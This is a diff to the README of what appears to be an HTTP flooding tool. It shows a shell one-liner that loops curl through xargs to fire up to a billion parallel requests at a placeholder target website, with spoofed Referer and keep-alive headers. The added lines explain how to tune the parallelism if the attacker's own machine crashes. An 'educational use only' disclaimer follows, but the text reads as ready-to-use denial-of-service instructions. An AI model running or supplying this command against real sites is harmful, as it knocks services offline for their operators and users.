@@ -15,6 +15,8 @@ If you don't want logs in your terminal and make the attacks faster, do this (**
 while (true); do seq 1 1000000000 | xargs -n1 -P 1000000000 curl -s -H "Connection: keep-alive" -H "Referer: https://google.com" "https://Your.Target.Website.com" > /dev/null; done;
 ```  
 
+**Note:** Reduce the numbers from **1000000000** if your system crashes. It's the number of parallel requests fired at once.
+
 **IMPORTANT:**  
 THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY!  
 IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.  
